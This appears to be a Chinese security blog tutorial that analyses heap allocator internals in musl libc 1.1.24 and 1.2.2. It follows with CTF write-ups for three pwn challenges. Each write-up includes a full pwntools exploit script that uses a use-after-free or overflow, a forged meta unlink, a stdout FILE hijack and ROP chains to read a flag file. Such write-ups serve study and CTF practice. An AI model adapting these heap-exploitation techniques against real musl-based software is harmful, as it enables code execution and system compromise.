@@ -1,0 +1,835 @@
+# 从musl libc 1.1.24到1.2.2 学习pwn姿势
+
+阅读量 **191428**
+
+|评论 **4**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2021-09-27 16:30:45
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p0.ssl.qhimg.com/t01bf5dd559a8f0c34f.jpg)
+
+## Musl libc
+
+最近有时间学一下Musl libc pwn的姿势。
+
+跟php pwn一样，以前遇到这样的pwn直接都不看的，经过了解之后发现，老版本的Musl
+libc和新版本之间差距还比较大。结合最近几次比赛中出现的Musl pwn，学习一下新老版本的Musl libc姿势。
+
+###  1.1.24
+
+**结构体**
+
+1.1.24代表了比较老版本的Musl libc，该版本的内存管理有以下几个相关的结构体:
+
+    
+    
+    struct chunk {
+        size_t psize, csize; // 与 glibc 的 prev size 和 size类似
+        struct chunk *next; 
+        struct chunk *prev;
+    };
+    
+    static struct {
+        volatile uint64_t binmap;#记录bins中bins[i]是否非空
+        struct bin bins[64];
+        volatile int free_lock[2];
+    } mal;
+    
+    struct bin {
+        volatile int lock[2];
+        struct chunk *head;
+        struct chunk *tail;
+    };
+    
+
+chunkd的结构与glibc类似，mal与glibc的arena相似，记录堆的状态，binmap表示bins[i]中的非空链，1代表bin为非空。  
+bin如果为空，head和tail为0或者指向bin自身。  
+bin如果非空，head和tail分别指向头和尾的chunk，头chunk的prev和尾chunk的next指向bin，构成双向链表。
+
+**malloc**
+
+分配过程主要有一下几个步骤：
+
+增加chunk头部，并且size对其0x20
+
+如果size大于MMAP_THRESHOLD，则使用mmap分配一块大小为size的内存
+
+如果size小于MMAP_THRESHOLD，计算size对应的bin下标：
+
+如果所有的bin都为空，延展堆空间，分配一个新的chunk；
+
+如果存在非空bin，选择与size最接近的bin，取bin首部的chunk，如果该chunk大小远大于size，使用pretrim分割chunk，否则unbin从链表中取出chunk。
+
+最后对chunk进行trim，主要是回收超过size的内存，减少内存浪费。
+
+**静态堆内存**
+
+程序初始化之后，查看mal结构体，会发现bins非空，有一个libc中的堆区和程序段的堆区。
+
+![](https://p2.ssl.qhimg.com/t014724aa6409a31497.png)
+
+###  1.2.2
+
+源码：<https://musl.libc.org/releases/musl-1.2.2.tar.gz>
+
+老版本的内存管理比较简单，新版本相对复杂一些，所以比较详细的分析一下Musl 1.2.2的相关代码。
+
+###  结构体
+
+chunk：  
+musl中其实没有专门的结构体，结合代码以及内存布局分析chunk结构。  
+chunk关于0x10字节对其，如果是group中的第一个chunk，p的前0x10字节作为group结构体的头部，包括meta地址等。  
+如果不是第一个chunk，只有前4字节作为元数据，包括了idx和offset，用来计算与该chunk与group地址的偏移。如果该chunk被释放，idx会被写为0xff，offset为0。  
+idx和offset的作用就是free时根据chunk地址找到该group对应meta的地址，也为漏洞利用做了铺垫。
+
+![](https://p2.ssl.qhimg.com/t0148f587fadb10a6e2.png)
+
+group：  
+在musl中一个meta管理的内存区域用group表示，一个meta对应一个group。  
+group中存放size相同的相邻chunk，通过idx和offset索引。
+
+    
+    
+    struct group {
+        struct meta *meta;// meta的地址
+        unsigned char active_idx:5;
+        char pad[UNIT - sizeof(struct meta *) - 1];// 保证0x10字节对齐
+        unsigned char storage[];# chunk
+    };
+    
+
+meta：  
+比较复杂的结构体，也是漏洞利用中不可缺少的。  
+meta之间以双向链表的形式维护了一个链式结构，可以理解为一个group被占用满时，开辟另一个group继续进行内存分配，这两个存放相同size的chunk的group通过meta的双向链表联系起来。  
+prev和next代表链表中相邻的meta，如果只有一个meta则指向自己，形成一个环。  
+mem指向meta维护的group。  
+avail_mask和freed_mask以bitmap方式表示group中chunk的状态。
+
+    
+    
+    struct meta {
+        struct meta *prev, *next;
+        struct group *mem;
+        volatile int avail_mask, freed_mask;
+        uintptr_t last_idx:5; //group中chunk数
+        uintptr_t freeable:1;
+        uintptr_t sizeclass:6; //管理group大小
+        uintptr_t maplen:8*sizeof(uintptr_t)-12;//mmap分配该变量为页数，其他为0
+    };
+    
+
+meta_arena：
+
+在内存页起始地址，是多个meta的集合，这样是为了meta & 0xffffffffffff000就能找到meta_arena结构体。
+
+结构体中比较重要的就是check，Musl为了保证meta不被伪造，会验证meta_arena中的check是否与malloc_context中的secret相等。
+
+    
+    
+    struct meta_area {
+        uint64_t check;
+        struct meta_area *next;
+        int nslots;
+        struct meta slots[];
+    };
+    
+
+malloc_context:  
+作为一个全局结构体，记录当前状态。
+
+    
+    
+    struct malloc_context {
+        uint64_t secret;//随机8字节，用来防止伪造meta
+    #ifndef PAGESIZE
+        size_t pagesize;
+    #endif
+        int init_done;
+        unsigned mmap_counter;
+        struct meta *free_meta_head;//释放的meta
+        struct meta *avail_meta;//可用分配的meta
+        size_t avail_meta_count, avail_meta_area_count, meta_alloc_shift;
+        struct meta_area *meta_area_head, *meta_area_tail;
+        unsigned char *avail_meta_areas;
+        struct meta *active[48];//可以分配的meta地址，idx与size相关
+        size_t usage_by_class[48];//所有meta的group管理chunk数量
+        uint8_t unmap_seq[32], bounces[32];
+        uint8_t seq;
+        uintptr_t brk;
+    };
+    
+
+###  malloc
+
+malloc的主要逻辑就是根据size映射一个sc，然后从ctx.active中找合适的group，然后根据avial_mask计算idx，通过group和idx确定一个chunk，然后调用enframe分配。
+
+    
+    
+    void *malloc(size_t n)
+    {
+        if (size_overflows(n)) return 0;
+        struct meta *g;
+        uint32_t mask, first;
+        int sc;
+        int idx;
+        int ctr;
+        //大于MMAP_THRESHOLD mmap分配，不关注这部分
+        if (n >= MMAP_THRESHOLD) {
+            ...
+            goto success;
+        }
+        //根据size取sc，类似glibc的各种bins
+        sc = size_to_class(n);
+    
+        rdlock();
+        //返回sc对应meta
+        g = ctx.active[sc];
+    
+        //meta为空且4=<sc<=32且不等于6且为偶数并且该sc没有正在使用的chunk
+        if (!g && sc>=4 && sc<32 && sc!=6 && !(sc&1) && !ctx.usage_by_class[sc]) {
+            size_t usage = ctx.usage_by_class[sc|1];
+            //使用更大sc的meta
+            if (!ctx.active[sc|1] || (!ctx.active[sc|1]->avail_mask
+                && !ctx.active[sc|1]->freed_mask))
+                usage += 3;
+            if (usage <= 12)
+                sc |= 1;
+            g = ctx.active[sc];
+        }
+        //取到avail_mask最低位的1，置零之后计算idx；
+        //根据idx从group中找chunk；
+        for (;;) {
+            mask = g ? g->avail_mask : 0;
+            first = mask&-mask;
+            if (!first) break;
+            if (RDLOCK_IS_EXCLUSIVE || !MT)
+                g->avail_mask = mask-first;
+            else if (a_cas(&g->avail_mask, mask, mask-first)!=mask)
+                continue;
+            idx = a_ctz_32(first);
+            goto success;
+        }
+        upgradelock();
+        //没有合适的chunk，分配新的meta和group
+        idx = alloc_slot(sc, n);
+        if (idx < 0) {
+            unlock();
+            return 0;
+        }
+        g = ctx.active[sc];
+    
+    success:
+        ctr = ctx.mmap_counter;
+        unlock();
+        //从meta中分配第idx个chunk，大小为n
+        return enframe(g, idx, n, ctr);
+    }
+    
+
+###  free
+
+大致过程就是获取meta，然后通过mask判断当前group的状态，如果还有被占用的chunk，就只是把freed_mask对应位置1，如果该group中的chunk全部空闲就会调用dequeue对该meta进行解链，然后更新ctx.active[sc]。
+
+    
+    
+    void free(void *p)
+    {
+        //为空直接返回
+        if (!p) return;
+        //获取chunk的meta
+        struct meta *g = get_meta(p);
+        int idx = get_slot_index(p);
+        size_t stride = get_stride(g);
+        unsigned char *start = g->mem->storage + stride*idx;
+        unsigned char *end = start + stride - IB;
+        get_nominal_size(p, end);
+        //计算mask
+        uint32_t self = 1u<<idx, all = (2u<<g->last_idx)-1;
+        //idx置为0xff，offset为0
+        ((unsigned char *)p)[-3] = 255;
+        // invalidate offset to group header, and cycle offset of
+        // used region within slot if current offset is zero.
+        *(uint16_t *)((char *)p-2) = 0;
+    
+        // release any whole pages contained in the slot to be freed
+        // unless it's a single-slot group that will be unmapped.
+        if (((uintptr_t)(start-1) ^ (uintptr_t)end) >= 2*PGSZ && g->last_idx) {
+            unsigned char *base = start + (-(uintptr_t)start & (PGSZ-1));
+            size_t len = (end-base) & -PGSZ;
+            if (len) madvise(base, len, MADV_FREE);
+        }
+        // 这里如果没有free的chunk或chunk要么被free要么avavil会跳出循环
+        // 表明释放了这个chunk, 那么这个group中所有的chunk都被回收。
+        // 执行到nontrivial_free(g, idx);
+        // atomic free without locking if this is neither first or last slot
+        for (;;) {
+            uint32_t freed = g->freed_mask;
+            uint32_t avail = g->avail_mask;
+            uint32_t mask = freed | avail;
+            assert(!(mask&self));
+            if (!freed || mask+self==all) break;
+            if (!MT)
+                g->freed_mask = freed+self;
+            else if (a_cas(&g->freed_mask, freed, freed+self)!=freed)
+                continue;
+            return;
+        }
+    
+        wrlock();
+        //回收掉这个group ,其中有unlink操作
+        struct mapinfo mi = nontrivial_free(g, idx);
+        unlock();
+        if (mi.len) munmap(mi.base, mi.len);
+    }
+    
+
+###  nontrivial_free
+
+Musl漏洞利用的关键位置，unlink操作没有检查。
+
+    
+    
+    static struct mapinfo nontrivial_free(struct meta *g, int i)
+    {
+        uint32_t self = 1u<<i;
+        int sc = g->sizeclass;
+        uint32_t mask = g->freed_mask | g->avail_mask;
+        //要么释放要么可用，且该meta可以被释放
+        //调用dequeue解链，同时判断是否是链表头的meta，是则激活后一个meta。
+        if (mask+self == (2u<<g->last_idx)-1 && okay_to_free(g)) {
+            // any multi-slot group is necessarily on an active list
+            // here, but single-slot groups might or might not be.
+            if (g->next) {
+                assert(sc < 48);
+                int activate_new = (ctx.active[sc]==g);
+                dequeue(&ctx.active[sc], g);
+                if (activate_new && ctx.active[sc])
+                    activate_group(ctx.active[sc]);
+            }
+            return free_group(g);
+         // 所有chunk都被占用，现在其中一个chunk要被释放
+         // 调用queue将其放到active中，重新进入链表中。
+        } else if (!mask) {
+            assert(sc < 48);
+            // might still be active if there were no allocations
+            // after last available slot was taken.
+            if (ctx.active[sc] != g) {
+                queue(&ctx.active[sc], g);
+            }
+        }
+        a_or(&g->freed_mask, self);
+        return (struct mapinfo){ 0 };
+    }
+    
+
+不安全的解链操作：
+
+dequeue：
+
+    
+    
+    static inline void dequeue(struct meta **phead, struct meta *m)
+    {
+        if (m->next != m) {
+            m->prev->next = m->next; //vul
+            m->next->prev = m->prev; //vul
+            if (*phead == m) *phead = m->next;
+        } else {
+            *phead = 0;
+        }
+        m->prev = m->next = 0;
+    }
+    
+
+## WMCTF_Nescafe 1.1.24
+
+漏洞UAF。是一个1.1.24老版本的Musl libc。禁用execve，考虑泄露栈地址rop。
+
+![](https://p2.ssl.qhimg.com/t018b00f8c4d98056ce.png)
+
+以noteList保存堆块，漏洞点很明显，存在UAF，并且没有初始化堆块，申请一个块即可泄露地址。  
+未初始化：
+
+    
+    
+    int create()
+    {
+      __int64 v0; // rax
+      unsigned int i; // [rsp+4h] [rbp-Ch]
+      void *buf; // [rsp+8h] [rbp-8h]
+    
+      buf = malloc(0x200uLL);
+      puts("Please input the content");
+      LODWORD(v0) = read(0, buf, 0x200uLL);
+      for ( i = 0; i <= 4; ++i )
+      {
+        v0 = noteList[i];
+        if ( !v0 )
+        {
+          noteList[i] = buf;
+          LODWORD(v0) = puts("Done");
+          return v0;
+        }
+      }
+      return v0;
+    }
+    
+
+UAF
+
+    
+    
+    int del()
+    {
+      __int64 v0; // rax
+      unsigned int v2; // [rsp+Ch] [rbp-4h]
+    
+      puts("idx:");
+      v2 = myRead();
+      if ( v2 > 5 )
+      {
+        puts("Invalid idx");
+        exit(0);
+      }
+      v0 = noteList[v2];
+      if ( v0 )
+      {
+        free((void *)noteList[v2]);#uaf
+        LODWORD(v0) = puts("Done");
+      }
+      return v0;
+    }
+    
+
+思路：
+
+1.leak:由于静态堆内存，程序没有对申请的堆块内容初始化，所以申请一个块直接就可以泄露libc基址。  
+2.利用：存在UAF，利用修改释放的堆块prev和next指针劫持mal.bins，并且发现程序段的静态堆内存刚好位于noteList下方，劫持mal.bins覆盖低字节，分配到noteList，实现任意地址读写。
+
+![](https://p1.ssl.qhimg.com/t0185025eafd1f814df.png)
+
+![](https://p0.ssl.qhimg.com/t01531db89a22fb5803.png)
+
+    
+    
+    from pwn import *
+    
+    context.log_level = 'debug'
+    context.arch = 'amd64'
+    sa = lambda s,n : sh.sendafter(s,n)
+    sla = lambda s,n : sh.sendlineafter(s,n)
+    sl = lambda s : sh.sendline(s)
+    sd = lambda s : sh.send(s)
+    rc = lambda n : sh.recv(n)
+    ru = lambda s : sh.recvuntil(s)
+    ti = lambda : sh.interactive()
+    
+    def add(c='a'):
+        sla('>>','1')
+        sa('the content',c)
+    def delete(idx):
+        sla('>>','2')
+        sla('idx:',str(idx))
+    def show(idx):
+        sla('>>','3')
+        sla('idx',str(idx))
+    def edit(idx,c):
+        sla('>>','4')
+        sla('idx:',str(idx))
+        sa('Content',c)
+    sh = process('./pwn')
+    libc = ELF('./libc.so')
+    add('a'*8)#0
+    show(0)
+    libc_base = u64(ru('\x7f')[-6:].ljust(8,'\x00')) - (0x00007f051c941e50 - 0x7f051c6af000)
+    mal_bins = libc_base + 0x292e00
+    environ = libc_base + libc.sym['_environ']
+    open_addr = libc_base + libc.sym['open']
+    read_addr = libc_base + libc.sym['read']
+    puts_addr = libc_base + libc.sym['puts']
+    pop_rdi = 0x0000000000014862 + libc_base
+    pop_rsi = 0x000000000001c237 + libc_base
+    pop_rdx = 0x000000000001bea2 + libc_base
+    print hex(libc_base)
+    add()#1
+    delete(0)
+    edit(0,p64(mal_bins)*2)#hijack mal.bin->head
+    add()#2
+    add()#3 hijack mal.bin
+    edit(3,'\x00'*0x68+'\x30')
+    add(p64(0)*6)#noteList[0] = &noteList And set show flag to 0
+    show(0)
+    elf_base = u64(ru('\x56')[-6:].ljust(8,'\x00')) - 0x202040
+    #print hex(elf_base)
+    #gdb.attach(sh)
+    noteList = elf_base + 0x202040
+    edit(0,p64(noteList)+p64(environ)+p64(0)*4)
+    show(1)
+    stack_addr = u64(ru('\x7f')[-6:].ljust(8,'\x00'))
+    ret_addr = stack_addr-(0x7ffc69254d18-0x7ffc69254ca8)
+    edit(0,p64(noteList)+p64(ret_addr)+'./flag\x00\x00'+p64(0)*3)
+    flag_addr = noteList+0x10
+    rop = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(0) + p64(open_addr)
+    rop += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(noteList+0x18) + p64(pop_rdx)+p64(0x30)+p64(read_addr)
+    rop += p64(pop_rdi) + p64(noteList+0x18) + p64(puts_addr)
+    print hex(stack_addr)
+    edit(1,rop)
+    print hex(ret_addr)
+    
+    ti()
+    
+
+## RCTF_Musl
+
+漏洞很简单，add中size为0时堆溢出。
+
+    
+    
+      size = readint("size?", a2);
+      *(_QWORD *)v5 = malloc(size);
+      v5[2] = size - 1;
+      puts("Contnet?");
+      return readn(*(_QWORD *)v5, v5[2]);
+    
+
+利用方式：
+
+泄露地址，溢出写到下一个管理块，show泄露secret；  
+利用dequeque的unlink，劫持 stdout_used，伪造stdout_FILE。  
+在大堆块中伪造meta，使得free时调用dequeue，写_stdout_use，利用m->next->pre = m->pre。
+
+    
+    
+    static inline void dequeue(struct meta **phead, struct meta *m)
+    {
+        if (m->next != m) {
+            m->prev->next = m->next;
+            m->next->prev = m->prev;# fake __stdout_used to m->prev
+            if (*phead == m) *phead = m->next;
+        } else {
+            *phead = 0;
+        }
+        m->prev = m->next = 0;
+    }
+    
+
+在m->pre的地址处伪造stdout_FILE结构体，exit时：
+
+    
+    
+    void __stdio_exit(void)
+    {
+        FILE *f;
+        for (f=*__ofl_lock(); f; f=f->next) close_file(f);
+        close_file(__stdin_used);
+        close_file(__stdout_used);#调用
+        close_file(__stderr_used);
+    }
+    
+    
+    
+    static void close_file(FILE *f)
+    {
+        if (!f) return;
+        FFINALLOCK(f);
+        if (f->wpos != f->wbase) f->write(f, 0, 0);#gadget栈迁移到ROP chain
+        if (f->rpos != f->rend) f->seek(f, f->rpos-f->rend, SEEK_CUR);
+    }
+    
+
+exp:
+
+    
+    
+    from pwn import *
+    
+    context.log_level = 'debug'
+    context.arch = 'amd64'
+    sa = lambda s,n : sh.sendafter(s,n)
+    sla = lambda s,n : sh.sendlineafter(s,n)
+    sl = lambda s : sh.sendline(s)
+    sd = lambda s : sh.send(s)
+    rc = lambda n : sh.recv(n)
+    ru = lambda s : sh.recvuntil(s)
+    ti = lambda : sh.interactive()
+    
+    def add(idx,sz,c='a'):
+        sla('>>','1')
+        sla('idx?',str(idx))
+        sla('size?',str(sz))
+        sla('Contnet?',c)
+    
+    def delete(idx):
+        sla('>>','2')
+        sla('idx?',str(idx))
+    
+    def show(idx):
+        sla('>>','3')
+        sla('idx?',str(idx))
+    
+    sh = process(['./libc.so','./r'])
+    libc = ELF('./libc.so')
+    
+    for i in range(15):
+        add(i,0xc)
+    
+    delete(0)
+    add(0,0,'a'*0xf)
+    show(0)
+    libc_base = u64(ru('\x7f')[-6:].ljust(8,'\x00')) - 0x298d50
+    ctx = libc_base + 0x295ae0
+    stdout = libc_base + 0x295450
+    
+    print hex(libc_base)
+    
+    delete(2)
+    add(2,0,'a'*0x10+p64(ctx))
+    show(3)
+    ru('Content: ')
+    secret = u64(rc(8))
+    print hex(secret)
+    
+    fake_mata = libc_base + 0x28d000+0x1000+8
+    fake_mem = libc_base + 0x298df0-0x20
+    fake_stdout_used = libc_base+0x295450
+    fake_stdout_ptr = libc_base + 0x28d000+0x50
+    magic_gadget = libc_base + 0x000000000004a5ae
+    p_rdi_rax = libc_base + 0x000000000007144e
+    p_rsi = libc_base + 0x000000000001b27a
+    p_rdx = libc_base + 0x0000000000009328
+    sys_call = libc_base + 0x0000000000023711
+    ret = libc_base + 0x000000000001689b
+    rop_addr = libc_base + 0x28d000+0x100
+    flag_addr = rop_addr - 0x100 + 0x20
+    delete(5)
+    payload = p64(fake_mata)+p64(0)+p64(fake_mem+0x20)
+    add(5,0,payload)
+    #open(flag,0)
+    rop = p64(p_rdi_rax)+p64(flag_addr)+p64(2)
+    rop += p64(p_rsi)+p64(0)+p64(sys_call)
+    #read(fd,buf,size)
+    rop += p64(p_rdi_rax)+p64(3)+p64(0)
+    rop += p64(p_rsi)+p64(flag_addr+0x600)
+    rop += p64(p_rdx)+p64(0x30)+p64(sys_call)
+    #write(1,buf,size)
+    rop += p64(p_rdi_rax)+p64(1)+p64(1)
+    rop += p64(p_rsi)+p64(flag_addr+0x600)
+    rop += p64(p_rdx)+p64(0x30)+p64(sys_call)
+    payload = './flag'.ljust(0x30,'\x00')
+    #fake __stdout_FILE
+    payload += '\x00'*0x30 + p64(rop_addr) + p64(ret) + p64(0) + p64(magic_gadget)
+    payload  = payload.ljust(0x100-0x20,'\x00') 
+    payload += rop
+    payload = payload.ljust(0x1000-0x20,'\x00') 
+    payload += p64(secret)+p64(fake_stdout_ptr)+p64(fake_stdout_used)+p64(fake_mem)
+    payload += p32(0x7e)+p32(0)
+    freeable = 1 
+    maplen = 1  
+    sizeclass = 1
+    last_idx = 6
+    last_value = last_idx | (freeable << 5) | (sizeclass << 6) | (maplen << 12)
+    payload +=p64(last_value)+p64(0)
+    add(10,0x2000,payload)
+    print hex(magic_gadget)
+    gdb.attach(sh)
+    delete(6)
+    ti()
+    
+
+## RCTF_warmnote
+
+musl 1.2.2，释放堆块时只对管理chunk进行了memset，没有对内容chunk清空。
+
+泄露：
+
+利用内容块残留内容填\0可以leak libc。（这里对musl管理方式每个meta的group中最多有多少slat还不太清楚，再看一下源码）
+
+利用后门leak secret。
+
+利用：
+
+伪造meta，通过unqueque劫持stdout_used，伪造stdout_File结构体（劫持f->write指针为gadgets栈迁移）
+
+![](https://p0.ssl.qhimg.com/t014211f43c24163ff4.png)
+
+![](https://p3.ssl.qhimg.com/t01883332d1c6760ab4.png)
+
+musl 1.2.2常用gadgets
+
+    
+    
+      gadgets:
+       0x7f0d63e025ae <longjmp+30>:    mov    rsp,QWORD PTR [rdi+0x30]
+       0x7f0d63e025b2 <longjmp+34>:    jmp    QWORD PTR [rdi+0x38]
+    
+
+程序流程：
+
+    
+    
+    exit -> __stdio_exit_needed -> close_file -> gadgets -> ropchain
+    
+
+exp:
+
+    
+    
+    from pwn import *
+    
+    context.log_level = 'debug'
+    context.arch = 'amd64'
+    sa = lambda s,n : sh.sendafter(s,n)
+    sla = lambda s,n : sh.sendlineafter(s,n)
+    sl = lambda s : sh.sendline(s)
+    sd = lambda s : sh.send(s)
+    rc = lambda n : sh.recv(n)
+    ru = lambda s : sh.recvuntil(s)
+    ti = lambda : sh.interactive()
+    
+    def add(sz,t='b\n',c='a\n'):
+        sla('>> ','1')
+        sla('Size: ',str(sz))
+        sa('Title: ',t)
+        sa('Note: ',c)
+    def show(idx):
+        sla('>> ','2')
+        sla('Index: ',str(idx))
+    def delete(idx):
+        sla('>> ','3')
+        sla('Index: ',str(idx))
+    def edit(idx,c):
+        sla('>> ','4')
+        sla('Index: ',str(idx))
+        sa('Note: ',c)
+    def dbg(addr):
+        gdb.attach(sh,'b *$rebase({})\nc\n'.format(addr))
+    def bkdoor(addr):
+        sla('>> ','666')
+        sla('[IN]: ',str(addr))
+    sh = process(['./libc.so','./warmnote'])
+    for i in range(3):
+        add(0x30,'a'*0x10,'a'*0x30)
+    delete(0)
+    delete(1)
+    add(0x30,'a'*0x10)
+    add(0x150,'a'*0x10)
+    show(1)
+    libc_base = u64(ru('\x7f')[-6:].ljust(8,'\x00'))-0x298d20
+    ctx = libc_base + 0x295ae0
+    fake_meta_addr = libc_base + 0x28d000 + 0x1000+8
+    fake_stdout_used = libc_base+0x295450
+    #fake_mem = libc_base + 
+    magic_gadget = libc_base + 0x000000000004a5ae
+    poprdiraxret = libc_base + 0x000000000007144e
+    poprsiret = libc_base + 0x000000000001b27a
+    poprdxret = libc_base + 0x0000000000009328
+    syscallret = libc_base + 0x0000000000023711
+    ret = libc_base + 0x000000000001689b
+    rop_addr = libc_base + 0x28d000+0x100
+    flag_addr = rop_addr - 0x100 + 0x20
+    stdout_used_ptr = libc_base + 0x28d000+0x50
+    bkdoor(ctx)
+    ru('[OUT]: ')
+    secret = u64(rc(8))
+    print hex(secret)
+    delete(0)
+    delete(1)
+    add(0x38)
+    add(0x38)
+    rop = p64(poprdiraxret)+p64(flag_addr)+p64(2)
+    rop +=p64(poprsiret)+p64(0)+p64(syscallret)
+    #read(fd,buf,size)
+    rop +=p64(poprdiraxret)+p64(3)+p64(0)
+    rop +=p64(poprsiret)+p64(flag_addr+0x600)
+    rop +=p64(poprdxret)+p64(0x30)+p64(syscallret)
+    #write(1,buf,size)
+    rop +=p64(poprdiraxret)+p64(1)+p64(1)
+    rop +=p64(poprsiret)+p64(flag_addr+0x600)
+    rop +=p64(poprdxret)+p64(0x30)+p64(syscallret)
+    
+    edit(1,'\x41'*0x30+p64(fake_meta_addr))
+    payload = './flag'.ljust(0x30,'\x00')
+    payload += '\x00'*0x30 + p64(rop_addr) + p64(ret) + p64(0)+p64(magic_gadget)
+    payload = payload.ljust(0x100-0x20,'\x00')
+    payload += rop
+    payload = payload.ljust(0x1000-0x20,'\x00')
+    payload += p64(secret)+p64(stdout_used_ptr) + p64(fake_stdout_used)+p64(libc_base-0x1a0)+p32(0x7e)+p32(0)
+    freeable = 1 
+    maplen = 1  
+    sizeclass = 4  
+    last_idx = 6
+    last_value = last_idx | (freeable << 5) | (sizeclass << 6) | (maplen << 12)
+    payload += p64(last_value) + p64(0)+'\n'
+    add(0x2000,'a\n',payload)
+    
+    print hex(libc_base)
+    # hijack __stdout_used
+    delete(0)
+    # exit -> __stdio_exit_needed -> close_file -> gadgets -> ropchain
+    sla('>> ','5')
+    
+    ti()
+    
+
+## 总结
+
+Musl作为一个轻量级的libc库，相对来说学习成本比较低，如果仅仅是为了解决当前比赛中的Musl
+pwn很快就能上手，但是分析源码和调试漏洞的过程中收获还是很多的。
+
+这个过程中借鉴了很多师傅的经验，受益匪浅，也少走了很多弯路。
+
+## 参考
+
+<https://niebelungen-d.top/2021/08/22/Musl-libc-Pwn-Learning/>
+
+Musl 1.1.24 分析
+
+<https://www.anquanke.com/post/id/246929>
+
+Musl 1.2.2 详解
+
+<https://f5.pm/go-76812.html>
+
+Musl 1.2.2中size_class映射关系
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **C4oy1** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/253566](/post/id/253566)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [Pwn](/tag/Pwn)
+  * [CTF](/tag/CTF)
+  * [musl](/tag/musl)
+
+ **+1** __5赞
+
+ __收藏
+
+![](https://p0.ssl.qhimg.com/t010fc4391fc78be88c.png) C4oy1
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
